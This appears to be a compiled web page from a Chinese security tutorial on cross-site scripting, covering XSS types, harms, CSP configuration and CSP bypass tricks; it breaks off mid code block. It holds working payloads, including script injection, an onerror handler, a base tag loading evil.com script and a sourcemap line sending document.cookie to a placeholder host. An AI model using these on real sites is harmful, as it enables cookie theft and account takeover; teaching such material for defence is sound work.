import{_ as s,o as a,c as l,Q as o}from"./chunks/framework.5b0c684c.js";const h=JSON.parse('{"title":"XSS（夸站脚本攻击）","description":"","frontmatter":{},"headers":[],"relativePath":"web-optimization/safe/1-1.md","filePath":"web-optimization/safe/1-1.md","lastUpdated":1729031503000}'),t={name:"web-optimization/safe/1-1.md"},e=o(`<h1 id="xss-夸站脚本攻击" tabindex="-1">XSS（夸站脚本攻击） <a class="header-anchor" href="#xss-夸站脚本攻击" aria-label="Permalink to &quot;XSS（夸站脚本攻击）&quot;">​</a></h1><nav class="table-of-contents"><ul><li><a href="#什么是xss">什么是XSS</a></li><li><a href="#xss四种类型">XSS四种类型</a><ul><li><a href="#反射型xss">反射型XSS</a></li><li><a href="#储存型xss">储存型XSS</a></li><li><a href="#dom-xss">DOM XSS</a></li><li><a href="#blind-xss">Blind XSS</a></li></ul></li><li><a href="#xss的危害">XSS的危害</a></li><li><a href="#csp">CSP</a><ul><li><a href="#配置">配置</a></li><li><a href="#bypass">Bypass</a></li></ul></li><li><a href="#xss数据源">XSS数据源</a></li><li><a href="#sink">Sink</a></li><li><a href="#xss保护">XSS保护</a><ul><li><a href="#html过滤">HTML过滤</a></li><li><a href="#x-frame">X-Frame</a></li></ul></li><li><a href="#waf-bypass">WAF Bypass</a></li><li><a href="#技巧">技巧</a></li><li><a href="#payload">Payload</a></li><li><a href="#持久化">持久化</a><ul><li><a href="#基于存储">基于存储</a></li><li><a href="#service-worker">Service Worker</a></li><li><a href="#appcache">AppCache</a></li></ul></li></ul></nav><h2 id="什么是xss" tabindex="-1">什么是XSS <a class="header-anchor" href="#什么是xss" aria-label="Permalink to &quot;什么是XSS&quot;">​</a></h2><p>XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。</p><h2 id="xss四种类型" tabindex="-1">XSS四种类型 <a class="header-anchor" href="#xss四种类型" aria-label="Permalink to &quot;XSS四种类型&quot;">​</a></h2><p>XSS 分为四种类型：<code>反射型XSS</code>、<code>储存型XSS</code>、<code>DOM XSS</code>、<code>Blind XSS</code>。</p><h3 id="反射型xss" tabindex="-1">反射型XSS <a class="header-anchor" href="#反射型xss" aria-label="Permalink to &quot;反射型XSS&quot;">​</a></h3><p>反射型XSS是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句：</p><blockquote><p><code>&lt;?php echo &quot;&lt;p&gt;hello, $_GET[&#39;user&#39;]&lt;/p&gt;&quot;;?&gt;</code> ，那么在访问时设置</p><p><code>/?user=&lt;/p&gt;&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;&lt;p&gt;</code> ，则可执行预设好的JavaScript代码。</p></blockquote><p>反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor、NoScript等防御手段的影响较大。</p><h3 id="储存型xss" tabindex="-1">储存型XSS <a class="header-anchor" href="#储存型xss" aria-label="Permalink to &quot;储存型XSS&quot;">​</a></h3><p>储存型XSS相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。</p><h3 id="dom-xss" tabindex="-1">DOM XSS <a class="header-anchor" href="#dom-xss" aria-label="Permalink to &quot;DOM XSS&quot;">​</a></h3><p>DOM型XSS不同之处在于DOM型XSS一般和服务器的解析响应没有直接关系，而是在JavaScript脚本动态执行的过程中产生的。</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#85E89D;">html</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#85E89D;">head</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">  &lt;</span><span style="color:#85E89D;">title</span><span style="color:#E1E4E8;">&gt;DOM Based XSS Demo&lt;/</span><span style="color:#85E89D;">title</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">  &lt;</span><span style="color:#85E89D;">script</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">    function xsstest() {</span></span>
<span class="line"><span style="color:#E1E4E8;">      var str </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> document.</span><span style="color:#B392F0;">getElementById</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;input&quot;</span><span style="color:#E1E4E8;">).value;</span></span>
<span class="line"><span style="color:#E1E4E8;">      document.</span><span style="color:#B392F0;">getElementById</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;output&quot;</span><span style="color:#E1E4E8;">).innerHTML </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;img src=&#39;&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> str </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&#39;&gt;&lt;/img&gt;&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">  &lt;/</span><span style="color:#85E89D;">script</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;/</span><span style="color:#85E89D;">head</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#85E89D;">body</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">  &lt;</span><span style="color:#85E89D;">div</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">id</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;output&quot;</span><span style="color:#E1E4E8;">&gt;&lt;/</span><span style="color:#85E89D;">div</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">  &lt;</span><span style="color:#85E89D;">input</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">type</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;text&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">id</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;input&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">size</span><span style="color:#FDAEB7;font-style:italic;">=50</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">value</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;&quot;</span><span style="color:#E1E4E8;"> /&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">  &lt;</span><span style="color:#85E89D;">input</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">type</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;button&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">value</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;submit&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">onclick</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;xsstest()&quot;</span><span style="color:#E1E4E8;"> /&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;/</span><span style="color:#85E89D;">body</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">&lt;/</span><span style="color:#85E89D;">html</span><span style="color:#E1E4E8;">&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">html</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">head</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">  &lt;</span><span style="color:#22863A;">title</span><span style="color:#24292E;">&gt;DOM Based XSS Demo&lt;/</span><span style="color:#22863A;">title</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">  &lt;</span><span style="color:#22863A;">script</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">    function xsstest() {</span></span>
<span class="line"><span style="color:#24292E;">      var str </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> document.</span><span style="color:#6F42C1;">getElementById</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;input&quot;</span><span style="color:#24292E;">).value;</span></span>
<span class="line"><span style="color:#24292E;">      document.</span><span style="color:#6F42C1;">getElementById</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;output&quot;</span><span style="color:#24292E;">).innerHTML </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;img src=&#39;&quot;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> str </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&#39;&gt;&lt;/img&gt;&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">  &lt;/</span><span style="color:#22863A;">script</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;/</span><span style="color:#22863A;">head</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">body</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">  &lt;</span><span style="color:#22863A;">div</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">id</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;output&quot;</span><span style="color:#24292E;">&gt;&lt;/</span><span style="color:#22863A;">div</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">  &lt;</span><span style="color:#22863A;">input</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">type</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;text&quot;</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">id</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;input&quot;</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">size</span><span style="color:#B31D28;font-style:italic;">=50</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">value</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;&quot;</span><span style="color:#24292E;"> /&gt;</span></span>
<span class="line"><span style="color:#24292E;">  &lt;</span><span style="color:#22863A;">input</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">type</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;button&quot;</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">value</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;submit&quot;</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">onclick</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;xsstest()&quot;</span><span style="color:#24292E;"> /&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;/</span><span style="color:#22863A;">body</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">&lt;/</span><span style="color:#22863A;">html</span><span style="color:#24292E;">&gt;</span></span></code></pre></div><p>输入 <code>x&#39; onerror=&#39;javascript:alert(/xss/)</code> 即可触发。</p><h3 id="blind-xss" tabindex="-1">Blind XSS <a class="header-anchor" href="#blind-xss" aria-label="Permalink to &quot;Blind XSS&quot;">​</a></h3><p>Blind XSS是储存型XSS的一种，它保存在某些存储中，当一个“受害者”访问这个页面时执行，并且在文档对象模型(DOM)中呈现payload。 它被称为Blind的原因是因为它通常发生在通常不暴露给用户的功能上。</p><h2 id="xss的危害" tabindex="-1">XSS的危害 <a class="header-anchor" href="#xss的危害" aria-label="Permalink to &quot;XSS的危害&quot;">​</a></h2><p>存在XSS漏洞时，可能会导致以下几种情况：</p><ol><li>用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。</li><li>攻击者能够在一定限度内记录用户的键盘输入。</li><li>攻击者通过CSRF等方式以用户身份执行危险操作。</li><li>XSS蠕虫。</li><li>获取用户浏览器信息。</li><li>利用XSS漏洞扫描用户内网。</li></ol><h2 id="csp" tabindex="-1">CSP <a class="header-anchor" href="#csp" aria-label="Permalink to &quot;CSP&quot;">​</a></h2><p>Content Security Policy，简称 CSP，译作<code>内容安全策略</code>。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。</p><h3 id="配置" tabindex="-1">配置 <a class="header-anchor" href="#配置" aria-label="Permalink to &quot;配置&quot;">​</a></h3><p>CSP配置：CSP策略可以通过 HTTP 头信息或者 meta 元素定义，CSP 有三类：</p><blockquote><p><code>Content-Security-Policy (Google Chrome)</code></p><p><code>X-Content-Security-Policy (Firefox)</code></p><p><code>X-WebKit-CSP (WebKit-based browsers, e.g. Safari)</code></p></blockquote><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#e1e4e8;">HTTP header：</span></span>
<span class="line"><span style="color:#e1e4e8;">&quot;Content-Security-Policy:&quot; 策略</span></span>
<span class="line"><span style="color:#e1e4e8;">&quot;Content-Security-Policy-Report-Only:&quot; 策略</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292e;">HTTP header：</span></span>
<span class="line"><span style="color:#24292e;">&quot;Content-Security-Policy:&quot; 策略</span></span>
<span class="line"><span style="color:#24292e;">&quot;Content-Security-Policy-Report-Only:&quot; 策略</span></span></code></pre></div><blockquote><p>HTTP Content-Security-Policy 头可以指定一个或多个资源是安全的，而Content-Security-Policy-Report-Only则是允许服务器检查（非强制）一个策略。多个头的策略定义由优先采用最先定义的。</p></blockquote><p>HTML Meta：</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#e1e4e8;">&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;策略&quot;&gt;</span></span>
<span class="line"><span style="color:#e1e4e8;">&lt;meta http-equiv=&quot;content-security-policy-report-only&quot; content=&quot;策略&quot;&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292e;">&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;策略&quot;&gt;</span></span>
<span class="line"><span style="color:#24292e;">&lt;meta http-equiv=&quot;content-security-policy-report-only&quot; content=&quot;策略&quot;&gt;</span></span></code></pre></div><h4 id="指令说明" tabindex="-1">指令说明 <a class="header-anchor" href="#指令说明" aria-label="Permalink to &quot;指令说明&quot;">​</a></h4><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>default-src</td><td>定义资源默认加载策略</td></tr><tr><td>connect-src</td><td>定义 Ajax、WebSocket 等加载策略</td></tr><tr><td>font-src</td><td>定义 Font 加载策略</td></tr><tr><td>frame-src</td><td>定义 Frame 加载策略</td></tr><tr><td>img-src</td><td>定义图片加载策略</td></tr><tr><td>media-src</td><td>定义 <code>&lt;audio&gt;</code>、<code>&lt;video&gt;</code> 等引用资源加载策略</td></tr><tr><td>object-src</td><td>定义 <code>&lt;applet&gt;</code>、<code>&lt;embed&gt;</code>、<code>&lt;object&gt;</code> 等引用资源加载策略</td></tr><tr><td>script-src</td><td>定义 JS 加载策略</td></tr><tr><td>style-src</td><td>定义 CSS 加载策略</td></tr><tr><td>base-uri</td><td>定义 <code>&lt;base&gt;</code> 根URL策略，不使用default-src作为默认值</td></tr><tr><td>sandbox</td><td>值为 allow-forms，对资源启用 sandbox</td></tr><tr><td>report-uri</td><td>值为 /report-uri，提交日志</td></tr></tbody></table><h4 id="关键字" tabindex="-1">关键字 <a class="header-anchor" href="#关键字" aria-label="Permalink to &quot;关键字&quot;">​</a></h4><table><thead><tr><th>关键字</th><th>描述</th></tr></thead><tbody><tr><td><code>-</code></td><td>允许从任意url加载，除了 data: blob: filesystem: schemes（e.g. <code>img-src -</code>）</td></tr><tr><td><code>none</code></td><td>禁止从任何url加载资源（e.g. <code>object-src &#39;none&#39;</code>）</td></tr><tr><td><code>self</code></td><td>只可以加载同源资源（e.g. <code>img-src &#39;self&#39;</code>）</td></tr><tr><td><code>data:</code></td><td>可以通过data协议加载资源（e.g. <code>img-src &#39;self&#39; data:</code>）</td></tr><tr><td><code>domain.example.com</code></td><td>只可以从特定的域加载资源（e.g. <code>img-src domain.example.com</code>）</td></tr><tr><td><code>\\*.example.com</code></td><td>可以从任意example.com的子域处加载资源（e.g. <code>img-src \\*.example.com</code>）</td></tr><tr><td><code>https://cdn.com</code></td><td>只能从给定的域用https加载资源（e.g. <code>img-src https://cdn.com</code>）</td></tr><tr><td><code>https:</code></td><td>只能从任意域用https加载资源（e.g. <code>img-src https:</code>）</td></tr><tr><td><code>unsafe-inline</code></td><td>允许内部资源执行代码例如style attribute,onclick或者是sicript标签（e.g. <code>script-src &#39;unsafe-inline&#39;</code>）</td></tr><tr><td><code>unsafe-eval</code></td><td>允许一些不安全的代码执行方式，例如js的eval()（e.g. <code>script-src &#39;unsafe-eval&#39;</code>）</td></tr><tr><td><code>nonce-&lt;base64-value&gt;&#39;</code></td><td>使用随机的nonce，允许加载标签上nonce属性匹配的标签（e.g. <code>script-src &#39;nonce-bm9uY2U=&#39;</code>）</td></tr><tr><td><code>&lt;hash-algo&gt;-&lt;base64-value&gt;&#39;</code></td><td>允许hash值匹配的代码块被执行（e.g. <code>script-src &#39;sha256-&lt;base64-value&gt;&#39;</code>）</td></tr></tbody></table><h4 id="配置范例" tabindex="-1">配置范例 <a class="header-anchor" href="#配置范例" aria-label="Permalink to &quot;配置范例&quot;">​</a></h4><p>允许执行内联 JS 代码，但不允许加载外部资源</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#e1e4e8;">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; &#39;unsafe-inline&#39;;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292e;">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; &#39;unsafe-inline&#39;;</span></span></code></pre></div><h3 id="bypass" tabindex="-1">Bypass <a class="header-anchor" href="#bypass" aria-label="Permalink to &quot;Bypass&quot;">​</a></h3><h4 id="预加载" tabindex="-1">预加载 <a class="header-anchor" href="#预加载" aria-label="Permalink to &quot;预加载&quot;">​</a></h4><p>浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为DNS-prefetch、subresource、prefetch、preconnect、prerender。</p><p>HTML5页面预加载是用link标签的rel属性来指定的。如果csp头有unsafe-inline，则用预加载的方式可以向外界发出请求，例如</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;!--</span><span style="color:#E1E4E8;"> 预加载某个页面 </span><span style="color:#F97583;">--&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#85E89D;">link</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">rel</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;prefetch&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">href</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;http://xxxx&#39;</span><span style="color:#E1E4E8;">&gt;&lt;!-- firefox --&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#85E89D;">link</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">rel</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;prerender&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">href</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;http://xxxx&#39;</span><span style="color:#E1E4E8;">&gt;&lt;!-- chrome --&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;!-- 预加载某个图片 --&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#85E89D;">link</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">rel</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;prefetch&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">href</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;http://xxxx/x.jpg&#39;</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;!-- DNS 预解析 --&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#85E89D;">link</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">rel</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;dns-prefetch&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">href</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;http://xxxx&quot;</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;!-- 特定文件类型预加载 --&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#85E89D;">link</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">rel</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;preload&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">href</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&#39;//xxxxx/xx.js&#39;</span><span style="color:#E1E4E8;">&gt;&lt;!-- chrome --&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;!--</span><span style="color:#24292E;"> 预加载某个页面 </span><span style="color:#D73A49;">--&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">link</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">rel</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;prefetch&#39;</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">href</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;http://xxxx&#39;</span><span style="color:#24292E;">&gt;&lt;!-- firefox --&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">link</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">rel</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;prerender&#39;</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">href</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;http://xxxx&#39;</span><span style="color:#24292E;">&gt;&lt;!-- chrome --&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;!-- 预加载某个图片 --&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">link</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">rel</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;prefetch&#39;</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">href</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;http://xxxx/x.jpg&#39;</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;!-- DNS 预解析 --&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">link</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">rel</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;dns-prefetch&quot;</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">href</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;http://xxxx&quot;</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;!-- 特定文件类型预加载 --&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">link</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">rel</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;preload&#39;</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">href</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&#39;//xxxxx/xx.js&#39;</span><span style="color:#24292E;">&gt;&lt;!-- chrome --&gt;</span></span></code></pre></div><p>另外，不是所有的页面都能够被预加载，当资源类型如下时，将阻止预加载操作：</p><blockquote><p>URL中包含下载资源；</p><p>页面中包含音频、视频；</p><p>POST、PUT和DELET操作的ajax请求；</p><p>HTTP认证；</p><p>HTTPS页面；</p><p>含恶意软件的页面；</p><p>弹窗页面；</p><p>占用资源很多的页面；</p><p>打开了chrome developer tools开发工具；</p></blockquote><h4 id="mime-sniff" tabindex="-1">MIME Sniff <a class="header-anchor" href="#mime-sniff" aria-label="Permalink to &quot;MIME Sniff&quot;">​</a></h4><p>举例来说，csp禁止跨站读取脚本，但是可以跨站读img，那么传一个含有脚本的img，再<code>&lt;script href=&#39;http://xxx.com/xx.jpg&#39;&gt;</code>，这里csp认为是一个img，绕过了检查，如果网站没有回正确的mime type，浏览器会进行猜测，就可能加载该img作为脚本</p><h4 id="_302跳转" tabindex="-1">302跳转 <a class="header-anchor" href="#_302跳转" aria-label="Permalink to &quot;302跳转&quot;">​</a></h4><p>对于302跳转绕过CSP而言，实际上有以下几点限制：</p><ul><li>跳板必须在允许的域内。</li><li>要加载的文件的host部分必须跟允许的域的host部分一致。</li></ul><h4 id="iframe" tabindex="-1">iframe <a class="header-anchor" href="#iframe" aria-label="Permalink to &quot;iframe&quot;">​</a></h4><p>当可以执行代码时，可以创建一个源为 css js 等静态文件的frame，在配置不当时，该frame并不存在csp，则在该frame下再次创建frame，达到bypass的目的。同理，使用 <code>../../../ /%2e%2e%2f</code> 等可能触发服务器报错的链接也可以到达相应的目的。</p><h4 id="base-uri" tabindex="-1">base-uri <a class="header-anchor" href="#base-uri" aria-label="Permalink to &quot;base-uri&quot;">​</a></h4><p>当script-src为nonce或无限制，且base-uri无限制时，可通过 base 标签修改根URL来bypass，如下加载了<a href="http://evil.com/main.js" target="_blank" rel="noreferrer">http://evil.com/main.js</a></p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#85E89D;">base</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">href</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;http://evil.com/&quot;</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#85E89D;">script</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">nonce</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;correct value&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">src</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;/main.js&quot;</span><span style="color:#E1E4E8;">&gt;&lt;/</span><span style="color:#85E89D;">script</span><span style="color:#E1E4E8;">&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">base</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">href</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;http://evil.com/&quot;</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">script</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">nonce</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;correct value&quot;</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">src</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;/main.js&quot;</span><span style="color:#24292E;">&gt;&lt;/</span><span style="color:#22863A;">script</span><span style="color:#24292E;">&gt;</span></span></code></pre></div><h4 id="其他" tabindex="-1">其他 <a class="header-anchor" href="#其他" aria-label="Permalink to &quot;其他&quot;">​</a></h4><ul><li>location 绕过</li><li>可上传SVG时，通过恶意SVG绕过同源站点</li><li>存在CRLF漏洞且可控点在CSP上方时，可以注入HTTP响应中影响CSP解析</li><li>CND Bypass，如果网站信任了某个CDN, 那么可利用相应CDN的静态资源bypass</li><li>Angular versions <code>&lt;1.5.9 &gt;=1.5.0</code>，存在漏洞 Git Pull Request</li><li>jQuery sourcemap：</li></ul><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#e1e4e8;">document.write(\`&lt;script&gt;</span></span>
<span class="line"><span style="color:#e1e4e8;">//@        sourceMappingURL=http://xxxx/\`+document.cookie+\`&lt;\\/script&gt;\`);\`\`</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292e;">document.write(\`&lt;script&gt;</span></span>
